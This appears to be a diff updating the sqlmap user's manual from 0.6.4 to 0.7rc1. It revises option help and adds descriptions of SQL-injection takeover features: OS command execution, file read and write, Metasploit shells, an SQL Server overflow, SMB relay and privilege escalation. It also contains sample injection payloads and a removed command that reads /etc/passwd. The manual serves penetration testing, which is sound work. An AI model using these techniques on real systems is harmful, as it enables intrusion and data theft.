@@ -4,7 +4,7 @@
 
 <title>sqlmap user's manual
 <author>by <htmlurl url="mailto:bernardo.damele@gmail.com" name="Bernardo Damele A. G.">
-<date>version 0.6.4, 3rd of February 2009
+<date>version 0.7 release candidate 1, April 22, 2009
 <abstract>
 This document is the user's manual to use <htmlurl url="http://sqlmap.sourceforge.net" name="sqlmap">.
 Check the project <htmlurl url="http://sqlmap.sourceforge.net" name="homepage">
@@ -24,8 +24,12 @@ in web applications. Once it detects one or more SQL injections on the
 target host, the user can choose among a variety of options to perform an
 extensive back-end database management system fingerprint, retrieve DBMS
 session user and database, enumerate users, password hashes, privileges,
-databases, dump entire or user's specific DBMS tables/columns, run his own
-SQL statement, read specific files on the file system and more.
+databases, dump entire or user's specified DBMS tables/columns, run his own
+SQL statement, read or write either text or binary files on the file
+system, execute arbitrary commands on the operating system, establish an
+out-of-band stateful connection between the attacker box and the database
+server via Metasploit payload stager, database stored procedure buffer
+overflow exploitation or SMB relay attack and more.
 
 
 <sect1>Requirements
@@ -34,7 +38,7 @@ SQL statement, read specific files on the file system and more.
 sqlmap is developed in <htmlurl url="http://www.python.org" name="Python">,
 a dynamic object-oriented interpreted programming language.
 This makes the tool independent from the operating system since it only
-requires the Python interpreter version equal or above to 2.4.
+requires the Python interpreter version equal or above to <bf>2.5</bf>.
 The interpreter is freely downloadable from its
 <htmlurl url="http://python.org/download/" name="official site">.
 To make it even easier, many GNU/Linux distributions come out of the box
@@ -42,6 +46,12 @@ with Python interpreter package installed and other Unices and MacOS X
 too provide it packaged in their formats and ready to be installed.
 Windows users can download and install the Python setup-ready installer
 for x86, AMD64 and Itanium too.
+
+sqlmap relies on the <htmlurl url="http://metasploit.com/framework/"
+name="Metasploit Framework"> for some of its post-exploitation takeover
+functionalities. You need to grab a copy of it from the
+<htmlurl url="http://metasploit.com/framework/download/" name="download">
+page. The required version is <bf>3.2</bf> or above.
 
 Optionally, if you are running sqlmap on Windows, you may wish to install
 <htmlurl url="http://ipython.scipy.org/moin/PyReadline/Intro" name="PyReadline">
@@ -144,10 +154,11 @@ sqlmap implements three techniques to exploit a SQL injection
 vulnerability:
 
 <itemize>
-<item><bf>Inferential blind SQL injection</bf>: sqlmap appends to the
-affected parameter in the HTTP request, a syntatically valid SQL statement
-string containing a <tt>SELECT</tt> sub-statement, or any other SQL
-statement whose the user want to retrieve the output.
+<item><bf>Inferential blind SQL injection</bf>, also known as <bf>boolean
+based blind SQL injection</bf>: sqlmap appends to the affected parameter in
+the HTTP request, a syntatically valid SQL statement string containing a
+<tt>SELECT</tt> sub-statement, or any other SQL statement whose the user
+want to retrieve the output.
 For each HTTP response, by making a comparison based upon HTML page
 content hashes, or string matches, with the original request, the tool
 determines the output value of the statement character by character.
@@ -155,21 +166,22 @@ The bisection algorithm implemented in sqlmap to perform this technique
 is able to fetch each output character with at maximum seven HTTP
 requests.
 This is sqlmap default SQL injection technique.
-<item><bf>UNION query (inband) SQL injection</bf>, also known as <bf>Full
+<item><bf>UNION query (inband) SQL injection</bf>, also known as <bf>full
 UNION query SQL injection</bf>: sqlmap appends to the affected parameter
 in the HTTP request, a syntatically valid SQL statement string starting
 with a <tt>UNION ALL SELECT</tt>. This techique is useful if the web
 application page passes the output of the <tt>SELECT</tt> statement to a
 <tt>for</tt> cycle, or similar, so that each line of the query output is
 printed on the page content.
-sqlmap is also able to exploit <bf>Partial UNION query SQL injection</bf>
-vulnerabilities which occur when the output of the statement is not cycled
-in a for construct whereas only the first entry output is displayed.
+sqlmap is also able to exploit <bf>partial (single entry) UNION query SQL
+injection</bf> vulnerabilities which occur when the output of the statement
+is not cycled in a for construct whereas only the first entry output is
+displayed.
 This technique is much faster if the target url is affected by because
 in a single HTTP response it returns the whole query output or a entry
 per each response within the page content.
 This SQL injection technique is an alternative to the first one.
-<item><bf>Stacked queries support</bf>, also known as <bf>multiple
+<item><bf>Batched (stacked) queries support</bf>, also known as <bf>multiple
 statements support</bf>: sqlmap tests if the web application supports
 stacked queries then, in case it does support, it appends to the affected
 parameter in the HTTP request, a semi-colon (<tt>;</tt>) followed by the
@@ -187,6 +199,10 @@ and the session user privileges.
 <p>
 Major features implemented in sqlmap include:
 
+
+<sect1>Generic features
+
+<p>
 <itemize>
 <item>Full support for <bf>MySQL</bf>, <bf>Oracle</bf>, <bf>PostgreSQL</bf>
 and <bf>Microsoft SQL Server</bf> back-end database management systems.
@@ -195,31 +211,8 @@ identify Microsoft Access, DB2, Informix, Sybase and Interbase.
 
 <item>Full support for three SQL injection techniques: <bf> inferential
 blind SQL injection</bf>, <bf>UNION query (inband) SQL injection</bf> and
-<bf>stacked queries (multiple statements) support</bf>. sqlmap can also
-test for <bf>time based blind SQL injection</bf>.
-
-<item><bf>Extensive back-end database management system fingerprint</bf>
-based upon
-<htmlurl url="http://bernardodamele.blogspot.com/2007/06/database-management-system-fingerprint.html" name="inband error messages">,
-<htmlurl url="http://bernardodamele.blogspot.com/2007/06/database-management-system-fingerprint.html" name="banner parsing">,
-<htmlurl url="http://bernardodamele.blogspot.com/2007/07/more-on-database-management-system.html" name="functions output comparison"> and
-<htmlurl url="http://bernardodamele.blogspot.com/2007/07/more-on-database-management-system.html" name="specific features">
-such as MySQL comment injection. It is also possible to force the back-end
-database management system name if you already know it. sqlmap is also able
-to fingerprint the web server operating system, the web application
-technology and, in some circumstances, the back-end DBMS operating system.
-
-<item>Options to retrieve on all four back-end database management system
-<bf>banner</bf>, <bf>current user</bf>, <bf>current database</bf>,
-enumerate <bf>users</bf>, <bf>users password hashes</bf>, <bf>users
-privileges</bf>, <bf>databases</bf>, <bf>tables</bf>, <bf>columns</bf>,
-dump <bf>tables entries</bf>, dump <bf>whole database management
-system</bf> and run your <bf>own SQL statement</bf>.
-
-<item>If the back-end database management system is MySQL it is also
-possible to <bf>read a specific file content</bf> from the ile system and,
-in some circumstances, <bf>prompt for an interactive operating system
-shell</bf> with TAB completion and history support.
+<bf>batched queries support</bf>. sqlmap can also test for <bf>time based
+blind SQL injection</bf>.
 
 <item>It is possible to provide a single target URL, get the list of
 targets from <htmlurl url="http://portswigger.net/suite/" name="Burp proxy">
@@ -287,17 +280,79 @@ save command line options on a configuration INI file.
 <htmlurl url="http://metasploit.com/framework/" name="Metasploit"> and <htmlurl
 url="http://w3af.sourceforge.net/" name="w3af">.
 
-<item><bf>File system</bf> read and write access and <bf>operating
-system</bf> command execution by providing own queries, depending on the
-session user privileges and back-end DBMS.
-
 <item><bf>PHP setting <tt>magic_quotes_gpc</tt> bypass</bf> by encoding
 every query string, between single quotes, with <tt>CHAR</tt>, or similar,
 database management system function.
 </itemize>
 
 
+<sect1>Enumeration features
+
+<p>
+<itemize>
+<item><bf>Extensive back-end database management system software and
+underlying operating system fingerprint</bf>
+based upon
+<htmlurl url="http://bernardodamele.blogspot.com/2007/06/database-management-system-fingerprint.html" name="inband error messages">,
+<htmlurl url="http://bernardodamele.blogspot.com/2007/06/database-management-system-fingerprint.html" name="banner parsing">,
+<htmlurl url="http://bernardodamele.blogspot.com/2007/07/more-on-database-management-system.html" name="functions output comparison"> and
+<htmlurl url="http://bernardodamele.blogspot.com/2007/07/more-on-database-management-system.html" name="specific features">
+such as MySQL comment injection. It is also possible to force the back-end
+database management system name if you already know it. sqlmap is also able
+to fingerprint the web server operating system, the web application
+technology and, in some circumstances, the back-end DBMS operating system.
+
+<item>Basic web server software and web application technology fingerprint.
+
+<item>Support to retrieve on all four back-end database management system
+<bf>banner</bf>, <bf>current user</bf>, <bf>current database</bf>, check
+if the current user is a database administrator, enumerate <bf>users</bf>,
+<bf>users password hashes</bf>, <bf>users privileges</bf>,
+<bf>databases</bf>, <bf>tables</bf>, <bf>columns</bf>, dump <bf>tables
+entries</bf>, dump <bf>whole database management system</bf> and run user's
+<bf>own SQL statement</bf>.
+</itemize>
+
+<sect1>Takeover features
+
+<p>
+<itemize>
+<item>Support to <bf>read either text or binary files</bf> from the
+database server underlying file system when the database software is MySQL,
+PostgreSQL and Microsoft SQL Server.
+
+<item>Support to <bf>execute arbitrary commands</bf> on the database server
+underlying operating system when the database software is MySQL,
+PostgreSQL via user-defined function injection and Microsoft SQL Server via
+<tt>xp_cmdshell()</tt> stored procedure.
+
+<item>Support to <bf>establish an out-of-band stateful connection between
+the attacker box and the database server</bf> underlying operating system
+via:
+<itemize>
+<item><bf>Stand-alone payload stager</bf> created by Metasploit and
+supporting Meterpreter, shell and VNC payloads for both Windows and Linux;
+<item><bf>Microsoft SQL Server 2000 and 2005 <tt>sp_replwritetovarbin</tt>
+stored procedure heap-based buffer overflow</bf> (MS09-004) exploitation
+with multi-stage Metasploit payload support;
+<item><bf>SMB reflection attack</bf> with UNC path request from the
+database server to the attacker box by using the Metasploit
+<tt>smb_relay</tt> exploit on the attacker box.
+</itemize>
+
+<item>Support for <bf>database process' user privilege escalation</bf> via
+Windows Access Tokens kidnapping on MySQL and Microsoft SQL Server via
+either Meterpreter's <tt>incognito</tt> extension or <tt>Churrasco</tt>
+stand-alone executable.
+</itemize>
+
 <sect>Download and update
+
+<p>
+<bf>sqlmap 0.7 release candidate 1</bf> version can be downloaded as a
+<htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7rc1.tar.gz"
+name="source gzip compressed"> file or as a <htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7rc1.zip"
+name="source zip compressed"> file.
 
 <p>
 sqlmap can be downloaded from its
@@ -306,24 +361,24 @@ name="SourceForge File List page">.
 It is available in various formats:
 
 <itemize>
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.4.tar.gz"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7rc1.tar.gz"
 name="Source gzip compressed"> operating system independent.
 
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.4.tar.bz2"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7rc1.tar.bz2"
 name="Source bzip2 compressed"> operating system independent.
 
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.4.zip"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7rc1.zip"
 name="Source zip compressed"> operating system independent.
 
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap_0.6.4-1_all.deb"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap_0.7rc1-1_all.deb"
 name="DEB binary package"> architecture independent for Debian and any
 other Debian derivated GNU/Linux distribution.
 
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.4-1.noarch.rpm"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7rc1-1.noarch.rpm"
 name="RPM binary package"> architecture independent for Fedora and any
 other operating system that can install RPM packages.
 
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.4_exe.zip"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7rc1_exe.zip"
 name="Portable executable for Windows"> that <bf>does not require the Python
 interpreter</bf> to be installed on the operating system.
 </itemize>
@@ -360,8 +415,8 @@ and <htmlurl url="mailto:daniele.bellucci@gmail.com" name="Daniele Bellucci">.
 <tscreen><verb>
 $ python sqlmap.py -h
 
-    sqlmap/0.6.4 coded by Bernardo Damele A. G. <bernardo.damele@gmail.com>
-                      and Daniele Bellucci <daniele.bellucci@gmail.com>
+    sqlmap/0.7rc1
+    by Bernardo Damele A. G. <bernardo.damele@gmail.com>
     
 Usage: sqlmap.py [options]
 
@@ -382,19 +437,20 @@ Options:
   Request:
     These options can be used to specify how to connect to the target url.
 
-    --method=METHOD     HTTP method, GET or POST (default: GET)
+    --method=METHOD     HTTP method, GET or POST (default GET)
     --data=DATA         Data string to be sent through POST
     --cookie=COOKIE     HTTP Cookie header
     --referer=REFERER   HTTP Referer header
     --user-agent=AGENT  HTTP User-Agent header
     -a USERAGENTSFILE   Load a random HTTP User-Agent header from file
-    --headers=HEADERS   Extra HTTP headers '\n' separated
-    --auth-type=ATYPE   HTTP Authentication type, value: Basic or Digest
-    --auth-cred=ACRED   HTTP Authentication credentials, value: name:password
+    --headers=HEADERS   Extra HTTP headers newline separated
+    --auth-type=ATYPE   HTTP Authentication type (value Basic or Digest)
+    --auth-cred=ACRED   HTTP Authentication credentials (value name:password)
     --proxy=PROXY       Use a HTTP proxy to connect to the target url
     --threads=THREADS   Maximum number of concurrent HTTP requests (default 1)
     --delay=DELAY       Delay in seconds between each HTTP request
     --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
+    --retries=RETRIES   Retries when the connection timeouts (default 3)
 
   Injection:
     These options can be used to specify which parameters to test for,
@@ -403,13 +459,13 @@ Options:
 
     -p TESTPARAMETER    Testable parameter(s)
     --dbms=DBMS         Force back-end DBMS to this value
+    --os=OS             Force back-end DBMS operating system to this value
     --prefix=PREFIX     Injection payload prefix string
     --postfix=POSTFIX   Injection payload postfix string
     --string=STRING     String to match in page when the query is valid
     --regexp=REGEXP     Regexp to match in page when the query is valid
-    --excl-str=ESTRING  String to be excluded before calculating page hash
-    --excl-reg=EREGEXP  Regexp matches to be excluded before calculating page
-                        hash
+    --excl-str=ESTRING  String to be excluded before comparing page contents
+    --excl-reg=EREGEXP  Matches to be excluded before comparing page contents
 
   Techniques:
     These options can be used to test for specific SQL injection technique
@@ -418,6 +474,7 @@ Options:
 
     --stacked-test      Test for stacked queries (multiple statements) support
     --time-test         Test for time based blind SQL injection
+    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
     --union-test        Test for UNION query (inband) SQL injection
     --union-tech=UTECH  Technique to test for UNION query SQL injection
     --union-use         Use the UNION query (inband) SQL injection to retrieve
@@ -436,13 +493,13 @@ Options:
     --current-db        Retrieve DBMS current database
     --is-dba            Detect if the DBMS current user is DBA
     --users             Enumerate DBMS users
-    --passwords         Enumerate DBMS users password hashes (opt: -U)
-    --privileges        Enumerate DBMS users privileges (opt: -U)
+    --passwords         Enumerate DBMS users password hashes (opt -U)
+    --privileges        Enumerate DBMS users privileges (opt -U)
     --dbs               Enumerate DBMS databases
-    --tables            Enumerate DBMS database tables (opt: -D)
-    --columns           Enumerate DBMS database table columns (req:-T opt:-D)
-    --dump              Dump DBMS database table entries (req: -T, opt: -D,
-                        -C, --start, --stop)
+    --tables            Enumerate DBMS database tables (opt -D)
+    --columns           Enumerate DBMS database table columns (req -T opt -D)
+    --dump              Dump DBMS database table entries (req -T, opt -D, -C,
+                        --start, --stop)
     --dump-all          Dump all DBMS databases tables entries
     -D DB               DBMS database to enumerate
     -T TBL              DBMS database table to enumerate
@@ -456,28 +513,32 @@ Options:
 
   File system access:
     These options can be used to access the back-end database management
-    system file system taking advantage of native DBMS functions or
-    specific DBMS design weaknesses.
+    system underlying file system.
 
-    --read-file=RFILE   Read a specific OS file content (only on MySQL)
-    --write-file=WFILE  Write to a specific OS file (not yet available)
+    --read-file=RFILE   Read a file from the back-end DBMS file system
+    --write-file=WFILE  Write a local file on the back-end DBMS file system
+    --dest-file=DFILE   Back-end DBMS absolute filepath to write to
 
   Operating system access:
     This option can be used to access the back-end database management
-    system operating system taking advantage of specific DBMS design
-    weaknesses.
+    system underlying operating system.
 
-    --os-shell          Prompt for an interactive OS shell (only on PHP/MySQL
-                        environment with a writable directory within the web
-                        server document root for the moment)
+    --os-cmd=OSCMD      Execute an operating system command
+    --os-shell          Prompt for an interactive operating system shell
+    --os-pwn            Prompt for an out-of-band shell, meterpreter or VNC
+    --os-smbrelay       One click prompt for an OOB shell, meterpreter or VNC
+    --os-bof            Stored procedure buffer overflow exploitation
+    --priv-esc          User priv escalation by abusing Windows access tokens
+    --msf-path=MSFPATH  Local path where Metasploit Framework 3 is installed
+    --tmp-path=TMPPATH  Remote absolute path of temporary files directory
 
   Miscellaneous:
-    --eta               Retrieve each query output length and calculate the
-                        estimated time of arrival in real time
+    --eta               Display for each output the estimated time of arrival
     --update            Update sqlmap to the latest stable version
     -s SESSIONFILE      Save and resume all data retrieved on a session file
     --save              Save options on a configuration INI file
     --batch             Never ask for user input, use the default behaviour
+    --cleanup           Clean up the DBMS by sqlmap specific UDF and tables
 </verb></tscreen>
 
 
@@ -574,7 +635,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.6.4 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 [hh:mm:55] [INFO] testing MySQL
@@ -587,7 +648,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.6.4 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 </verb></tscreen>
@@ -607,7 +668,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.6.4 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:44] [TRAFFIC IN] HTTP response (OK - 200):
@@ -628,7 +689,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.6.4 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 </verb></tscreen>
@@ -648,7 +709,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.6.4 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:17] [TRAFFIC IN] HTTP response (OK - 200):
@@ -676,7 +737,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.6.4 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:18] [TRAFFIC IN] HTTP response (OK - 200):
@@ -986,7 +1047,7 @@ Host: 192.168.1.125:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.6.4 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
 Cookie: ASPSESSIONIDSABTRCAS=HPCBGONANJBGFJFHGOKDMCGJ
 Connection: close
 
@@ -1002,7 +1063,7 @@ Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
 Cookie: ASPSESSIONIDSABTRCAS=469
-User-agent: sqlmap/0.6.4 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:40] [WARNING] Cookie parameter 'ASPSESSIONIDSABTRCAS' is not dynamic
@@ -1053,7 +1114,7 @@ Accept-language: en-us,en;q=0.5
 Referer: http://www.google.com
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.6.4 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 </verb></tscreen>
@@ -1069,7 +1130,7 @@ By default sqlmap perform HTTP requests providing the following HTTP
 <tt>User-Agent</tt> header value:
 
 <tscreen><verb>
-sqlmap/0.6.4 (http://sqlmap.sourceforge.net)
+sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
 </verb></tscreen>
 
 <p>
@@ -1190,7 +1251,7 @@ Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
 Authorization: Basic dGVzdHVzZXI6dGVzdHBhc3M=
-User-agent: sqlmap/0.6.4 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 
@@ -1211,7 +1272,7 @@ Authorization: Digest username="testuser", realm="Testing digest authentication"
 nonce="Qw52C8RdBAA=2d7eb362292b24718dcb6e4d9a7bf0f13d58fa9d", 
 uri="/sqlmap/mysql/digest/get_int.php?id=1", response="16d01b08ff2f77d8ff0183d706f96747", 
 algorithm="MD5", qop=auth, nc=00000001, cnonce="579be5eb8753693a"
-User-agent: sqlmap/0.6.4 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 </verb></tscreen>
@@ -1327,6 +1388,16 @@ the HTTP request timed out. The valid value is a float, for instance
 10.5 means ten seconds and a half.
 
 
+<sect2>Maximum number of retries when the HTTP connection timeouts
+
+<p>
+Option: <tt>--retries</tt>
+
+<p>
+It is possible to specify the maximum number of retries when the HTTP
+connection timeouts. By default it retries up to three times.
+
+
 <sect1>Injection
 
 <p>
@@ -1384,7 +1455,7 @@ Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
 $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/ua_str.php" -v 1 \
-  -p "user-agent" --user-agent "sqlmap/0.6.4 (http://sqlmap.sourceforge.net)"
+  -p "user-agent" --user-agent "sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)"
 
 [hh:mm:40] [WARNING] the testable parameter 'user-agent' you provided is not into the GET
 [hh:mm:40] [INFO] testing connection to the target url
@@ -1468,6 +1539,33 @@ back-end database management system. If you do not know it, let sqlmap
 automatically identify it for you.
 
 
+<sect2>Force the database management system operating system name
+
+<p>
+Option: <tt>--os</tt>
+
+<p>
+By default sqlmap automatically detects the web application's back-end
+database manangement system underlying operating system when requested by
+any other functionality.
+At the moment the fully supported operating systems are two:
+
+<itemize>
+<item>Linux
+<item>Windows
+</itemize>
+
+<p>
+It is possible to force the operating system name if you already know it so
+that sqlmap will skip the fingerprint.
+
+<p>
+Note that this option is <bf>not</bf> mandatory and it is strongly
+recommended to use it <bf>only if you are absolutely sure</bf> about the
+back-end database management system underlying operating system. If you do
+not know it, let sqlmap automatically identify it for you.
+
+
 <sect2>Custom injection payload
 
 <p>
@@ -1500,7 +1598,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.6.4 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 [hh:mm:17] [INFO] GET parameter 'id' is custom injectable 
@@ -1572,7 +1670,7 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_refresh.php?id=
 [hh:mm:50] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int_refresh.php?id=1 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.6.4 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:50] [TRAFFIC IN] HTTP response (OK - 200):
@@ -1594,7 +1692,7 @@ Content-Type: text/html
 [hh:mm:51] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int_refresh.php?id=1 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.6.4 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:51] [TRAFFIC IN] HTTP response (OK - 200):
@@ -1616,7 +1714,7 @@ Content-Type: text/html
 [hh:mm:51] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int_refresh.php?id=1 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.6.4 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:51] [TRAFFIC IN] HTTP response (OK - 200):
@@ -1824,10 +1922,10 @@ stacked queries support:    'name=luther'; WAITFOR DELAY '0:0:5';-- AND 'wRcBC'=
 <sect2>Test for time based blind SQL injection
 
 <p>
-Option: <tt>--time-test</tt>
+Options: <tt>--time-test</tt> and <tt>--time-sec</tt>
 
 <p>
-It is possible to test if the target URL is affected by a <bf>Time based
+It is possible to test if the target URL is affected by a <bf>time based
 blind SQL injection</bf> vulnerability.
 
 <p>
@@ -1889,6 +1987,11 @@ stacked query syntax
 time based blind sql injection payload:    'name=luther'; WAITFOR DELAY '0:0:5';-- AND 
 'PmrXn'='PmrXn'
 </verb></tscreen>
+
+<p>
+It is also possible to set the seconds to delay the response by providing
+the <tt>--time-sec</tt> option followed by an integer. By default it delays
+five seconds.
 
 
 <sect2>Test for UNION query SQL injection
@@ -2038,7 +2141,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.6.4 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:29] [TRAFFIC IN] HTTP response (OK - 200):
@@ -3124,7 +3227,7 @@ Table: users
 | 1  | luther                                       | blissett          |
 | 2  | fluffy                                       | bunny             |
 | 3  | wu                                           | ming              |
-| 4  | sqlmap/0.6.4 (http://sqlmap.sourceforge.net) | user agent header |
+| 4  | sqlmap/0.7rc1 (http://sqlmap.sourceforge.net) | user agent header |
 | 5  | NULL                                         | nameisnull        |
 +----+----------------------------------------------+-------------------+
 </verb></tscreen>
@@ -3176,7 +3279,7 @@ Table: users
 | 1  | luther                                       | blissett          |
 | 2  | fluffy                                       | bunny             |
 | 3  | wu                                           | ming              |
-| 4  | sqlmap/0.6.4 (http://sqlmap.sourceforge.net) | user agent header |
+| 4  | sqlmap/0.7rc1 (http://sqlmap.sourceforge.net) | user agent header |
 | 5  |                                              | nameisnull        |
 +----+----------------------------------------------+-------------------+
 
@@ -3189,7 +3292,7 @@ $ cat /software/sqlmap/output/192.168.1.121/dump/public/users.csv
 "1","luther","blissett"
 "2","fluffy","bunny"
 "3","wu","ming"
-"4","sqlmap/0.6.4 (http://sqlmap.sourceforge.net)","user agent header"
+"4","sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)","user agent header"
 "5","","nameisnull"
 </verb></tscreen>
 
@@ -3217,7 +3320,7 @@ Table: users
 +----+----------------------------------------------+-------------------+
 | 2  | fluffy                                       | bunny             |
 | 3  | wu                                           | ming              |
-| 4  | sqlmap/0.6.4 (http://sqlmap.sourceforge.net) | user agent header |
+| 4  | sqlmap/0.7rc1 (http://sqlmap.sourceforge.net) | user agent header |
 +----+----------------------------------------------+-------------------+
 </verb></tscreen>
 
@@ -3249,7 +3352,7 @@ Table: users
 | 1  | luther                                       | blissett          |
 | 2  | fluffy                                       | bunny             |
 | 3  | wu                                           | ming              |
-| 4  | sqlmap/0.6.4 (http://sqlmap.sourceforge.net) | user agent header |
+| 4  | sqlmap/0.7rc1 (http://sqlmap.sourceforge.net) | user agent header |
 | 5  | NULL                                         | nameisnull        |
 +----+----------------------------------------------+-------------------+
 
@@ -3338,7 +3441,7 @@ Table: users
 +----+----------------------------------------------+-------------------+
 | id | name                                         | surname           |
 +----+----------------------------------------------+-------------------+
-| 4  | sqlmap/0.6.4 (http://sqlmap.sourceforge.net) | user agent header |
+| 4  | sqlmap/0.7rc1 (http://sqlmap.sourceforge.net) | user agent header |
 | 2  | fluffy                                       | bunny             |
 | 1  | luther                                       | blisset           |
 | 3  | wu                                           | ming              |
@@ -3735,48 +3838,34 @@ support when the back-end DBMS is PostgreSQL.
 
 <sect1>File system access
 
-<sect2>Read a specific file content
+<sect2>Read a file from the back-end DBMS file system
 
 <p>
 Option: <tt>--read-file</tt>
 
 <p>
-If the back-end database management system is MySQL and the current user
-has <tt>FILE</tt> access (access to <tt>LOAD_FILE()</tt> builtin function),
-it is possible to read the content of a specific file from the file system.
+This paragraph will be written for sqlmap 0.7 stable version, refer to the white paper <htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control"> for the moment.
+
+
+<sect2>Write a local file on the back-end DBMS file system
 
 <p>
-Example on a <bf>MySQL 5.0.67</bf> target:
+Options: <tt>--write-file</tt> and <tt>--dest-file</tt>
 
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" \
-  --read-file /etc/passwd -v 0
-
-/etc/passwd:
----
